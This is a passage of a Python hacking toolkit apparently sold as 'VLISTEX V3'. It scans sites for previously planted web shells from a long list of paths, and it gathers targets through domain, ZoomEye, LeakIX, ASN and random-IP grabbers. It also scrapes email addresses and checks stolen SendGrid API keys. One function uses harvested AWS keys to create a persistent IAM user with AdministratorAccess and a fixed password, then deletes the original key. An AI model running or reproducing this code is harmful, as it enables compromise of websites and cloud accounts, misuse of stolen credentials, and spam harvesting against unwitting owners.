'/includes/madspotshell.php', '/includes/info.php', '/includes/egyshell.php', '/includes/Sym.php', '/includes/c22.php', '/includes/c100.php', '/includes/configuration.php', '/includes/g.php', '/includes/xx.pl', '/includes/ls.php', '/includes/Cpanel.php', '/includes/k.php', '/includes/zone-h.php', '/includes/tmp/user.php', '/includes/tmp/Sym.php', '/includes/cp.php', '/includes/tmp/madspotshell.php', '/includes/tmp/root.php', '/includes/tmp/whmcs.php', '/includes/tmp/index.php', '/includes/tmp/2.php', '/includes/tmp/dz.php', '/includes/tmp/cpn.php', '/includes/tmp/changeall.php', '/includes/tmp/Cgishell.pl', '/includes/tmp/sql.php', '/includes/0day.php', '/includes/tmp/admin.php', '/includes/L3b.php', '/includes/d.php', '/includes/tmp/d.php', '/includes/tmp/L3b.php', '/includes/sado.php', '/includes/admin1.php', '/includes/upload.php', '/includes/up.php', '/includes/vb.zip', '/includes/vb.rar', '/includes/admin2.asp', '/includes/uploads.php', '/includes/sa.php', '/includes/sysadmins/', '/includes/admin1/', '/includes/sniper.php', '/includes/images/Sym.php', '/includes//r57.php', '/includes/gzaa_spysl', '/includes/sql-new.php', '/includes//shell.php', '/includes//sa.php', '/includes//admin.php', '/includes//sa2.php', '/includes//2.php', '/includes//gaza.php', '/includes//up.php', '/includes//upload.php', '/includes//uploads.php', '/includes/shell.php', '/includes//amad.php', '/includes//t00.php', '/includes//dz.php', '/includes//site.rar', '/includes//Black.php', '/includes//site.tar.gz', '/includes//home.zip', '/includes//home.rar', '/includes//home.tar', '/includes//home.tar.gz', '/includes//forum.zip', '/includes//forum.rar', '/includes//forum.tar', '/includes//forum.tar.gz', '/includes//test.txt', '/includes//ftp.txt', '/includes//user.txt', '/includes//site.txt', '/includes//error_log', '/includes//error', '/includes//cpanel', '/includes//awstats', '/includes//site.sql', '/includes//vb.sql', '/includes//forum.sql', '/includes/r00t-s3c.php', '/includes/c.php', '/includes//backup.sql', '/includes//back.sql', '/includes//data.sql', '/includes/wp.rar/', '/includes/asp.aspx', '/includes/tmp/vaga.php', '/includes/tmp/killer.php', '/includes/whmcs.php', '/includes/abuhlail.php', '/includes/tmp/killer.php', '/includes/tmp/domaine.pl', '/includes/tmp/domaine.php', '/includes/useradmin/', '/includes/tmp/d0maine.php', '/includes/d0maine.php', '/includes/tmp/sql.php', '/includes/X.php', '/includes/123.php', '/includes/m.php', '/includes/b.php', '/includes/up.php', '/includes/tmp/dz1.php', '/includes/dz1.php', '/includes/forum.zip', '/includes/Symlink.php', '/includes/Symlink.pl', '/includes/forum.rar', '/includes/joomla.zip', '/includes/joomla.rar', '/includes/wp.php', '/includes/buck.sql', '/includes/sysadmin.php', '/includes/images/c99.php', '/includes/xd.php', '/includes/c100.php', '/includes/spy.aspx', '/includes/xd.php', '/includes/tmp/xd.php', '/includes/sym/root/home/', '/includes/billing/killer.php', '/includes/tmp/upload.php', '/includes/tmp/admin.php', '/includes/Server.php', '/includes/tmp/uploads.php', '/includes/tmp/up.php', '/includes/Server/', '/includes/wp-admin/c99.php', '/includes/tmp/priv8.php', '/includes/priv8.php', '/includes/cgi.pl/', '/includes/tmp/cgi.pl', '/includes/downloads/dom.php', '/includes/webadmin.html', '/includes/admins.php', '/includes/bluff.php', '/includes/king.jeen', '/includes/admins/', '/includes/admins.asp', '/includes/admins.php', '/includes/wp.zip', '/includes/', '/templates/rhuk_milkyway/WSO.php', '/templates/rhuk_milkyway/dz.php', '/templates/rhuk_milkyway/DZ.php', '/templates/rhuk_milkyway/cpanel.php', '/templates/rhuk_milkyway/cpn.php', '/templates/rhuk_milkyway/sos.php', '/templates/rhuk_milkyway/term.php', '/templates/rhuk_milkyway/Sec-War.php', '/templates/rhuk_milkyway/sql.php', '/templates/rhuk_milkyway/ssl.php', '/templates/rhuk_milkyway/mysql.php', '/templates/rhuk_milkyway/WolF.php', '/templates/rhuk_milkyway/madspot.php', '/templates/rhuk_milkyway/Cgishell.pl', '/templates/rhuk_milkyway/killer.php', '/templates/rhuk_milkyway/changeall.php', '/templates/rhuk_milkyway/2.php', '/templates/rhuk_milkyway/Sh3ll.php', '/templates/rhuk_milkyway/dz0.php', '/templates/rhuk_milkyway/dam.php', '/templates/rhuk_milkyway/user.php', '/templates/rhuk_milkyway/dom.php', '/templates/rhuk_milkyway/whmcs.php', '/templates/rhuk_milkyway/vb.zip', '/templates/rhuk_milkyway/r00t.php', '/templates/rhuk_milkyway/c99.php', '/templates/rhuk_milkyway/gaza.php', '/templates/rhuk_milkyway/1.php', '/templates/rhuk_milkyway/d0mains.php', '/templates/rhuk_milkyway/madspotshell.php', '/templates/rhuk_milkyway/info.php', '/templates/rhuk_milkyway/egyshell.php', '/templates/rhuk_milkyway/Sym.php', '/templates/rhuk_milkyway/c22.php', '/templates/rhuk_milkyway/c100.php', '/templates/rhuk_milkyway/configuration.php', '/templates/rhuk_milkyway/g.php', '/templates/rhuk_milkyway/xx.pl', '/templates/rhuk_milkyway/ls.php', '/templates/rhuk_milkyway/Cpanel.php', '/templates/rhuk_milkyway/k.php', '/templates/rhuk_milkyway/zone-h.php', '/templates/rhuk_milkyway/tmp/user.php', '/templates/rhuk_milkyway/tmp/Sym.php', '/templates/rhuk_milkyway/cp.php', '/templates/rhuk_milkyway/tmp/madspotshell.php', '/templates/rhuk_milkyway/tmp/root.php', '/templates/rhuk_milkyway/tmp/whmcs.php', '/templates/rhuk_milkyway/tmp/index.php', '/templates/rhuk_milkyway/tmp/2.php', '/templates/rhuk_milkyway/tmp/dz.php', '/templates/rhuk_milkyway/tmp/cpn.php', '/templates/rhuk_milkyway/tmp/changeall.php', '/templates/rhuk_milkyway/tmp/Cgishell.pl', '/templates/rhuk_milkyway/tmp/sql.php', '/templates/rhuk_milkyway/0day.php', '/templates/rhuk_milkyway/tmp/admin.php', '/templates/rhuk_milkyway/L3b.php', '/templates/rhuk_milkyway/d.php', '/templates/rhuk_milkyway/tmp/d.php', '/templates/rhuk_milkyway/tmp/L3b.php', '/templates/rhuk_milkyway/sado.php', '/templates/rhuk_milkyway/admin1.php', '/templates/rhuk_milkyway/upload.php', '/templates/rhuk_milkyway/up.php', '/templates/rhuk_milkyway/vb.zip', '/templates/rhuk_milkyway/vb.rar', '/templates/rhuk_milkyway/admin2.asp', '/templates/rhuk_milkyway/uploads.php', '/templates/rhuk_milkyway/sa.php', '/templates/rhuk_milkyway/sysadmins/', '/templates/rhuk_milkyway/admin1/', '/templates/rhuk_milkyway/sniper.php', '/templates/rhuk_milkyway/images/Sym.php', '/templates/rhuk_milkyway//r57.php', '/templates/rhuk_milkyway/gzaa_spysl', '/templates/rhuk_milkyway/sql-new.php', '/templates/rhuk_milkyway//shell.php', '/templates/rhuk_milkyway//sa.php', '/templates/rhuk_milkyway//admin.php', '/templates/rhuk_milkyway//sa2.php', '/templates/rhuk_milkyway//2.php', '/templates/rhuk_milkyway//gaza.php', '/templates/rhuk_milkyway//up.php', '/templates/rhuk_milkyway//upload.php', '/templates/rhuk_milkyway//uploads.php', '/templates/rhuk_milkyway/shell.php', '/templates/rhuk_milkyway//amad.php', '/templates/rhuk_milkyway//t00.php', '/templates/rhuk_milkyway//dz.php', '/templates/rhuk_milkyway//site.rar', '/templates/rhuk_milkyway//Black.php', '/templates/rhuk_milkyway//site.tar.gz', '/templates/rhuk_milkyway//home.zip', '/templates/rhuk_milkyway//home.rar', '/templates/rhuk_milkyway//home.tar', '/templates/rhuk_milkyway//home.tar.gz', '/templates/rhuk_milkyway//forum.zip', '/templates/rhuk_milkyway//forum.rar', '/templates/rhuk_milkyway//forum.tar', '/templates/rhuk_milkyway//forum.tar.gz', '/templates/rhuk_milkyway//test.txt', '/templates/rhuk_milkyway//ftp.txt', '/templates/rhuk_milkyway//user.txt', '/templates/rhuk_milkyway//site.txt', '/templates/rhuk_milkyway//error_log', '/templates/rhuk_milkyway//error', '/templates/rhuk_milkyway//cpanel', '/templates/rhuk_milkyway//awstats', '/templates/rhuk_milkyway//site.sql', '/templates/rhuk_milkyway//vb.sql', '/templates/rhuk_milkyway//forum.sql', '/templates/rhuk_milkyway/r00t-s3c.php', '/templates/rhuk_milkyway/c.php', '/templates/rhuk_milkyway//backup.sql', '/templates/rhuk_milkyway//back.sql', '/templates/rhuk_milkyway//data.sql', '/templates/rhuk_milkyway/wp.rar/', '/templates/rhuk_milkyway/asp.aspx', '/templates/rhuk_milkyway/tmp/vaga.php', '/templates/rhuk_milkyway/tmp/killer.php', '/templates/rhuk_milkyway/whmcs.php', '/templates/rhuk_milkyway/abuhlail.php', '/templates/rhuk_milkyway/tmp/killer.php', '/templates/rhuk_milkyway/tmp/domaine.pl', '/templates/rhuk_milkyway/tmp/domaine.php', '/templates/rhuk_milkyway/useradmin/', '/templates/rhuk_milkyway/tmp/d0maine.php', '/templates/rhuk_milkyway/d0maine.php', '/templates/rhuk_milkyway/tmp/sql.php', '/templates/rhuk_milkyway/X.php', '/templates/rhuk_milkyway/123.php', '/templates/rhuk_milkyway/m.php', '/templates/rhuk_milkyway/b.php', '/templates/rhuk_milkyway/up.php', '/templates/rhuk_milkyway/tmp/dz1.php', '/templates/rhuk_milkyway/dz1.php', '/templates/rhuk_milkyway/forum.zip', '/templates/rhuk_milkyway/Symlink.php', '/templates/rhuk_milkyway/Symlink.pl', '/templates/rhuk_milkyway/forum.rar', '/templates/rhuk_milkyway/joomla.zip', '/templates/rhuk_milkyway/joomla.rar', '/templates/rhuk_milkyway/wp.php', '/templates/rhuk_milkyway/buck.sql', '/templates/rhuk_milkyway/sysadmin.php', '/templates/rhuk_milkyway/images/c99.php', '/templates/rhuk_milkyway/xd.php', '/templates/rhuk_milkyway/c100.php', '/templates/rhuk_milkyway/spy.aspx', '/templates/rhuk_milkyway/xd.php', '/templates/rhuk_milkyway/tmp/xd.php', '/templates/rhuk_milkyway/sym/root/home/', '/templates/rhuk_milkyway/billing/killer.php', '/templates/rhuk_milkyway/tmp/upload.php', '/templates/rhuk_milkyway/tmp/admin.php', '/templates/rhuk_milkyway/Server.php', '/templates/rhuk_milkyway/tmp/uploads.php', '/templates/rhuk_milkyway/tmp/up.php', '/templates/rhuk_milkyway/Server/', '/templates/rhuk_milkyway/wp-admin/c99.php', '/templates/rhuk_milkyway/tmp/priv8.php', '/templates/rhuk_milkyway/priv8.php', '/templates/rhuk_milkyway/cgi.pl/', '/templates/rhuk_milkyway/tmp/cgi.pl', '/templates/rhuk_milkyway/downloads/dom.php', '/templates/rhuk_milkyway/webadmin.html', '/templates/rhuk_milkyway/admins.php', '/templates/rhuk_milkyway/bluff.php', '/templates/rhuk_milkyway/king.jeen', '/templates/rhuk_milkyway/admins/', '/templates/rhuk_milkyway/admins.asp', '/templates/rhuk_milkyway/admins.php', '/templates/rhuk_milkyway/wp.zip', '/templates/rhuk_milkyway/WSO.php']
                for shell in shells:    
                    respz = requests.get(sites+"/"+shell, allow_redirects=False, timeout = 10).text
                    if 'drwxr-xr-x' in respz:
                        print(f"| {sites} | SHELL FOUND")
                        open("shells.txt","a").write(sites+"/"+shell+"n")
                        return 0
                    else:
                        print(f"| {sites} | NO VULN NO SHELL ")
                        return 0
                        
        os.system(["clear", "cls"][os.name == 'nt'])
        for line in logo.splitlines():
            print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
            time.sleep(0.05)        
        sitese = input(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] List > {Style.RESET_ALL}")
        sites = open(sitese, "r", encoding="utf8" ).read().splitlines()
        thread6 = input(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Thread > {Style.RESET_ALL}")
      #  if sites:
          #  try:
        with ThreadPoolExecutor(int(thread6)) as zz:    
            zz.map(find,sites)
          #  except:
           #     pass

    elif select == "5":
        os.system(["clear", "cls"][os.name == 'nt'])
        for line in logo.splitlines():
            print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
            time.sleep(0.05)
        def grab1(y,m,d):
            tanggal = f"{y}-{m}-{d}"
            req = requests.Session()
            soup = BeautifulSoup(req.get(f"https://www.thesiterank.com/newly-registered-domain-names-by-date/{y}-{m}-{d}/1").content, 'html.parser')
            lastPage = [a['href'].split('/')[-1] for a in soup.find('ul',{'class':'pagination-sm pagination'}).find_all('li',{'class':'page-item'})[-1]]
            with concurrent.futures.ThreadPoolExecutor() as exec:
                exec.submit(grab3,tanggal,lastPage,y,m,d)

        def grab2(tanggal,data):
            if data in open(f"AdjustableSpanner/{tanggal}.txt").read().splitlines():
                return
            open(f"AdjustableSpanner/{tanggal}.txt","a+").write(f"{data}n")

        def grab3(tanggal,lastpage,y,m,d):
            req = requests.Session()
            print(f"n{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Total Page To Grab In {tanggal} Is > {lastpage[0]}")
            print(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} ..:: Starting Script ::..")
            
            for page in range(1,int(lastpage[0])+1):
                soup = BeautifulSoup(req.get(f"https://www.thesiterank.com/newly-registered-domain-names-by-date/{y}-{m}-{d}/{page}").content, 'html.parser')
                allsite = [a.text.strip() for a in soup.find_all('div',{'class': 'col-md-4'})]
                for site in allsite:
                    
                    print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE}-GRABBING-{Fore.RED}[{Fore.WHITE}{site}{Fore.RED}]')
                    with concurrent.futures.ThreadPoolExecutor() as exec:
                        exec.submit(grab2,tanggal,site)
                
            print('n[#] Success > {} domain'.format(sum(1 for line in open(f'AdjustableSpanner/{tanggal}.txt', 'r'))))

        y = int(input(f"{Fore.WHITE}[{Fore.RED}?{Fore.WHITE}]{Fore.WHITE} Years : "))
        m = int(input(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Month : "))
        d = int(input(f"{Fore.WHITE}[{Fore.RED}V{Fore.WHITE}]{Fore.WHITE} Dates : "))

        tanggal = f"{y}-{m}-{d}"
        if not os.path.exists("AdjustableSpanner"):
            os.makedirs("AdjustableSpanner")
        if not os.path.exists(f"AdjustableSpanner/{tanggal}.txt"):
            open(f"AdjustableSpanner/{tanggal}.txt","w").write("")

        grab1(y,m,d)

    elif select == "7":
        class ZoomEye(object):
            import json
            os.system(["clear", "cls"][os.name == 'nt'])
            for line in logo.splitlines():
                print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
                time.sleep(0.05)
            def __init__(self, username=None, password=None):
                self.username = username
                self.password = password

                self.access_token = ''
                # self.zoomeye_login_api = "https://api.zoomeye.org/user/login"
                # self.zoomeye_dork_api = "https://api.zoomeye.org/{}/search"

                self.ip_port_list = []

                self.load_access_token()

            def load_access_token(self):
                if not os.path.isfile('access_token.txt'):
                    print(Fore.WHITE + '[' + Fore.RED + '!'+ Fore.WHITE + ']' + ' info : access_token file is not exist, please login first...')
                    self.login()
                else:
                    with open('access_token.txt', 'r') as fr:
                        self.access_token = fr.read()

            def save_access_token(self):
                with open('access_token.txt', 'w') as fw:
                    fw.write(self.access_token)

            def login(self):
                import json
                """
                Prompt to input account name and password
                :return: None
                """
                print('REGISTER FIRST IN WEBSITE https://www.zoomeye.org/')
                self.username = input(Fore.WHITE + '[' + Fore.RED + '!'+ Fore.WHITE + ']' + ' username-email zoomeye :').strip()
                self.password = input(Fore.WHITE + '[' + Fore.RED + '!'+ Fore.WHITE + ']' + ' password-account zoomeye :').strip()
                print(Fore.WHITE + '[' + Fore.RED + '!'+ Fore.WHITE + ']' + ' try to login ::...')
                data = {
                    'username': self.username,
                    'password': self.password
                }

                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
                }

                
                data_encoded = json.dumps(data)
              #  try:
                resp = requests.post(url='https://api.zoomeye.org/user/login', data=data_encoded, headers=headers)
                
                r_decoded = json.loads(resp.text)

                access_token = r_decoded['access_token']
                self.access_token = access_token
                self.save_access_token()
              #  except:
                  #  print(Fore.WHITE + '[' + Fore.RED + '!'+ Fore.WHITE + ']' +' info : username or password is wrong, please try again ')
                 #   exit()

            def search(self):
                import json
                if not self.access_token:
                    self.login()

                headers = {
                    'Authorization': 'JWT ' + self.access_token,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
                }

                query = input(Fore.WHITE + '[' + Fore.RED + '!'+ Fore.WHITE + ']' + ' please input search string : ')

                page = int(input(Fore.WHITE + '[' + Fore.RED + '!'+ Fore.WHITE + ']' + ' please input start page : '))

                num = int(input(Fore.WHITE + '[' + Fore.RED + '!'+ Fore.WHITE + ']' + ' please input number of pages you want to retrieve : '))

                index = 0
                while True:
                    try:
                        if index == num:
                            break
                        msg = '[{}/{}] fetch page: {}'.format(index+1, num, page)
                        print(msg)

                        api = 'https://api.zoomeye.org/host/search'
                        # searchurl = '{}{}&page={}'.format(api, query, page)
                        print(Fore.WHITE + '[' + Fore.RED + '!'+ Fore.WHITE + ']' + 'query > ', query)

                        page += 1
                        index += 1

                        resp = requests.get(api, headers=headers, params={"query": query, "page": page})
                        r_decoded = json.loads(resp.text)
                        for x in r_decoded['matches']:
                            print(Fore.WHITE + '[' + Fore.RED + '!'+ Fore.WHITE + ']' + x['ip'], ':', x['portinfo']['port'])
                            self.ip_port_list.append(x['ip'] + ':' + str(x['portinfo']['port']))
                    except Exception as e:
                        if str(e) == 'matches':
                            print(Fore.WHITE + '[' + Fore.RED + '!'+ Fore.WHITE + ']' +' info : account was break, excceeding the max limitations')
                            break
                        else:
                            print(Fore.WHITE + '[' + Fore.RED + '!'+ Fore.WHITE + ']' + ' info : ', str(e))
                self.save_result()
                pass

            def save_result(self):
                xtime = time.strftime("[%Y-%m-%d][%H.%M.%S]")
                ip_port_list_file = '{}.txt'.format(xtime)

                #  ip:port
                with open(ip_port_list_file, 'w') as fw:
                    for line in self.ip_port_list:
                        fw.write(line + 'n')
                pass
        zoomeye = ZoomEye()
        zoomeye.search()
        pass
    elif select == "8":
        try:
            import json
            sampah = []
            os.system(["clear", "cls"][os.name == 'nt'])
            for line in logo.splitlines():
                print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
                time.sleep(0.05)
            q = input(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Query/Dork : ")
            thread = input(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Thread : ")
            brppage1 = int(input(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} From Page ? : "))
            brppage = int(input(f"{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Until Page ? : "))
            xx = int(thread)
            zx = Pool(xx)
            if q:
                pass
            else:
                q = '*'
            for t in range(brppage1 , brppage):
                print(Fore.WHITE + '[' + Fore.RED + '!'+ Fore.WHITE + ']' + ' Page > ' + str(t))
                u = 'https://leakix.net/search?page=' + str(t) + '&q=' + q + '&scope=leak'
                headers = { 
            'Accept': 'application/json'}
                x = requests.get(u, headers=headers)
                op = json.loads(x.text)
                try:
                
                    for aw in op:   
                        if aw['ip'] == "":
                            print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} {Fore.RED}VLISTEX V3 {Fore.WHITE}| {Fore.RED}NO RESULT IN THIS PAGE {Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE}')   
                        else:
                            if aw['ip'] not in sampah :
                                sampah.append(aw['ip'])
                                print(f'{Fore.RED}VLISTEX {Fore.WHITE}| {Fore.YELLOW}LEAKIX GRABBER')
                                print(Fore.WHITE + '[' + Fore.RED + '!'+ Fore.WHITE + ']' + '| SUCCES |> '+ aw['ip'])
                                fx = open('ips-result.txt', 'a')
                                fx.write(aw['ip'] + 'n')
                                fx.close()
                
                            
                    

                except:
                    pass
        
        except:
            pass
        

    elif select == "12":
        def ASN():
          #  try:
            import webbrowser
            os.system(["clear", "cls"][os.name == 'nt'])
            for line in logo.splitlines():
                print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
                time.sleep(0.05)
            print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Choose ASN ')
            webbrowser.open('https://ipinfo.io/countries')
            ASN = input(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Input ASN CODE: ')
        
            r = requests.get(f"https://api.bgpview.io/asn/{ASN}/prefixes").json()
            rather = r['data']['ipv4_prefixes']
            for Yh in range(0, int(len(rather)) - 1):
        
                IPM = r['data']['ipv4_prefixes'][Yh]
                Jahl = IPM['ip'] + '/' + str(IPM['cidr'])
                IPL = ipranges.IP4Net(Jahl)
                for IP in IPL:  
    
                    open('AdjustableSpanner/UNCHECKED_ASN_IPS.txt', 'a', errors='ignore', encoding='utf-8').write(f"{IP}n")
                    print(f"x1b[95m{IP}")

         #   except Exception as e:
                try:
                    pass
                finally:
                    e = None
                    del e
        ASN()
    elif select == "14":
        os.system(["clear", "cls"][os.name == 'nt'])
        for line in logo.splitlines():
            print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
            time.sleep(0.05)
        print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Thanks For Buying Our Tools :* 2.1')
        filename = input(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Input List: ')
        with open(filename, 'r') as f:
            file = f.readlines()

        wordList = []
        badList = []

        for line in file:
            if line in wordList:
                print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Detected Duplicate | {line}')
                badList.append(line)
            else:
                wordList.append(line)

        file = open('no-dup-'+filename, 'w')

        for line in wordList:
            file.write(line)

        file.close()
        print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Already Saved In no-dup-{filename}')
    elif select == "6":  
        def grabRandomMail(filwx):
            requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
       # while True:
            if not filwx.startswith("http"): 
                filwx = "http://" + filwx
            try:
                text = requests.get( filwx, timeout = 5 , verify=False ).text
                mails = regex.findall("[A-Za-z0-9_%+-.]+@[A-Za-z0-9.-]+.[A-Za-z]{2,5}", text)
            except:
                print( Fore.RED+'| '+ Fore.YELLOW + filwx + Fore.RED + " | "+Fore.RED+"DIE/BAD SITE ")
                pass
            for mail in mails: 
                if mail not in tmp:
                    tmp.append( mail )
                    if is_email( mail, check_dns=True):
                        print( Fore.RED+'| '+ Fore.GREEN + mail + Fore.RED + " | "+Fore.WHITE+" AUTO CHECK MAIL VALID > "+ Fore.YELLOW + filwx )
                        open('AdjustableSpanner/mailist-vlistexv3.txt', 'a').write( mail+'n' )
                    else:
                        print( Fore.RED+'| '+ Fore.RED + mail + Fore.RED + " | "+Fore.RED+" NOT VALID MAIL ")
                else:   
                    print( Fore.RED+'| '+ Fore.RED + mail + Fore.RED + " | "+Fore.RED+" DUPLICATE REMOVER > "+ Fore.YELLOW + filwx )
                    pass
                #  break
            
            
        os.system(["clear", "cls"][os.name == 'nt'])
        for line in logo.splitlines():
            print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
            time.sleep(0.05)
        print(f'[!] Make Sure U Input Thread Depends On The Ram And Core Because This Process Take A Lot Memory And CPU')
        filename = input(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Input List: ')
        try:
            t1 = time.perf_counter()
            filex = open( filename, "r", encoding="utf8" , errors='ignore').read().splitlines()
            threadblue = input(f"{Fore.WHITE}|{Fore.RED}INPUT{Fore.WHITE}| Thread : {Style.RESET_ALL}")   
        except:
            pass
        if filename:
            try:
                with ThreadPoolExecutor(int(threadblue)) as zz:
                            zz.map(grabRandomMail, filex)
            except:
                pass
        t2 = time.perf_counter()
        print(f'MultiThreaded Code Took:{t2 - t1} seconds')
        print('Script Already Done')
       
        print('Script Done')
    elif select == "21":
        def SendgridCheck(apikey):
            try:
                url = 'https://api.sendgrid.com/v3/user/credits'
                headers = {"authorization": "Bearer "+ apikey }
                getInfo = requests.get(url, headers=headers)
                limit = json.loads(getInfo.text)['total']
                used = json.loads(getInfo.text)['used']
                reset = json.loads(getInfo.text)['reset_frequency']
                print('n')
                print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Limit Sendgrid : {Fore.WHITE}{limit}')
                print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Already Used   : {Fore.WHITE}{used}')
                print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Reset Timee    : {Fore.WHITE}{reset}')
                with open("AdjustableSpanner/sendgridcheck-results.txt", "a") as x:
                    x.write(f"APIKEY: {apikey}nLimit: {limit}nUsed: {used}nReset: {reset}nn")
                print('n ___________________{Fore.RED}VLISTEXCHECKER{Fore.WHITE}__________________________ ')
            except:
                print(f'n')
                print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Cant Acces    :{Fore.WHITE}', json.loads(getInfo.text)['errors'][0]['message'])
                print(f'n___________________{Fore.RED}VLISTEXCHECKER{Fore.WHITE}_____________________________')
        
      

        
        os.system(["clear", "cls"][os.name == 'nt'])
        for line in logo.splitlines():
            print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
            time.sleep(0.05)
        try:
            filename = input(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Input List: ')
            with open(filename, 'r') as f:
                f = f.read().splitlines()
                for i in range( len( f ) ):
                    try:
                        if ( "[" and "SENDGRID_API_KEY" and "=" ) not in f[i]:
                            f[i] = "SENDGRID_API_KEY = " + f[i].replace(" ", "")
                        apikey = re.findall("SENDGRID_API_KEY = (.*)", f[i])[0]
                        print(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} ApiKey: {apikey.strip()}')
                        SendgridCheck(apikey.strip())
                    except:
                        continue
        except:
            pass
    elif select == "22":
        os.system(["clear", "cls"][os.name == 'nt'])
        for line in maintance.splitlines():
            print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
        time.sleep(0.05)
        input('Click Enter To Exit')
        return 0
        def AwsUser(ACCESS_KEY, SECRET_KEY, REGION):
            try:
                print(ACCESS_KEY+ SECRET_KEY+ REGION)
                import boto3
                UsernameLogin = 'system'
                user = ACCESS_KEY
                keyacces = SECRET_KEY
                regionz = REGION
                client = boto3.client('iam', aws_access_key_id=user, aws_secret_access_key=keyacces, region_name=regionz)
                data = '[O][ACCOUNT]{}|{}|{}'.format(user, keyacces, regionz)
                Create_user = client.create_user(UserName=UsernameLogin)
                bitcg = f"User: {Create_user['User']['UserName']}"
                xxxxcc = f"User: {Create_user['User']['Arn']}"
                pws = 'BfJm5nNTBuvdw3rMUgzNTmFVtZpmgpPKnC8AzxWHbLZwupg44fS7RRbBMWrmqB58CDSVja4gNEjYem3BDteRvgpfExQheKuK24tv9Eh7atgFxjJW8x3Lz7df@@@'
                Buat = client.create_login_profile(Password=pws, PasswordResetRequired=False, UserName=UsernameLogin)
                Admin = client.attach_user_policy(PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess', UserName=UsernameLogin)
                xxx = bitcg + '|' + UsernameLogin + '|' + pws + '|'
                remover = str(xxx).replace('r', '')
                simpan = open('AdjustableSpanner/IamAccount.txt', 'a')
                simpan.write(remover + 'nn')
                simpan.close()
                response = client.delete_access_key(AccessKeyId=user)     
                print(Fore.GREEN+'Sucess')  
            except: 
                print(Fore.RED+'Failed / Aws Cant Login Or Acces')
              
            
        filename = input(f'{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.WHITE} Input List: ')
        with open(filename, 'r') as f:
            f = f.read().splitlines()
            for anjing in f:
                try:
                    anjing.replace(" ", "")
                    awskey = re.findall("AWS_KEY = (.*)", anjing)[0]
                    awssecret = re.findall("AWS_SECRET = (.*)", anjing)[-1]
                    awsregion = re.findall("AWS_REGION = (.*)", anjing)[0]
                except:
                    pass
            print(awskey+awssecret+awsregion) 
            AwsUser(awskey, awssecret, awsregion)
            
         #   
    elif select == "13":
        from random import randint
        os.system(["clear", "cls"][os.name == 'nt'])
        for line in logo.splitlines():
            print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
            time.sleep(0.05)
        def dip_ipgen():
            while True :
                a = randint(0,225)
                b = randint(0,225)
                c = randint(0,225)
                d = randint(0,225)
                make = ('{}.{}.{}.{}'.format(a,b,c,d))
                print( Fore.RED+'| '+ Fore.GREEN + make + Fore.RED + " | "+Fore.WHITE+" GENERATOR IP > "+ Fore.YELLOW + "VLISTEX")
                with open('generator-ips.txt','a') as file :
                    file.write(make+'n')
                    file.close()    
        dip_ipgen()
    elif select == "15":
        def finder(i):
            fr = Fore.RED
            gr = Fore.BLUE
            fc = Fore.CYAN
            fw = Fore.WHITE
            fy = Fore.YELLOW
            fg = Fore.GREEN
            sd = Style.DIM
            sn = Style.NORMAL
            sb = Style.BRIGHT
            Bad = 0
            Good = 0
            pro = 0
            mailer = 0
            password = 0
            head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
            try:
                x = requests.session()
                listaa = ['x.php', 'alfa.php', 'c99.php', 'mini.php', 'a.php', 'wso.php', 'home.php', 'shell.php', 'leaf.php', 'wp-admin.php', 'leafmailer2.8.php', 'wso.php', 'a.php', 'leaf.php',
            'alex.php',
            'uploader.php',
            'mailer.php',
            'anone.php',
            'a.php',
